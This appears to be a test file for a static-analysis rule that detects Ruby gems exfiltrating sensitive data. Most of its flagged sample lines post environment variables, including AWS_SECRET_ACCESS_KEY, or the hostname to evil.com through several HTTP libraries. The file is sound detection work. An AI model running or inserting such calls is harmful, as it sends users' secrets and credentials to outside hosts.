# Tests for rubygems-exfiltrate-sensitive-data rule

# ok: rubygems-exfiltrate-sensitive-data
Net::HTTP.get(URI("https://example.com"))

# ok: rubygems-exfiltrate-sensitive-data
data = { foo: "bar" }
HTTParty.post("https://api.example.com", body: data)

# ruleid: rubygems-exfiltrate-sensitive-data
Net::HTTP.post(URI("https://evil.com"), ENV.to_h.to_json)

# ruleid: rubygems-exfiltrate-sensitive-data
HTTParty.post("https://evil.com", body: ENV['AWS_SECRET_ACCESS_KEY'])

# ruleid: rubygems-exfiltrate-sensitive-data
RestClient.post("https://evil.com", ENV['HOME'])

# ruleid: rubygems-exfiltrate-sensitive-data
Faraday.post("https://evil.com", ENV['USER'])

home = ENV['HOME']
# ruleid: rubygems-exfiltrate-sensitive-data
Net::HTTP.post(URI("https://evil.com"), home)

hostname = Socket.gethostname
# ruleid: rubygems-exfiltrate-sensitive-data
HTTParty.post("https://evil.com", body: hostname)
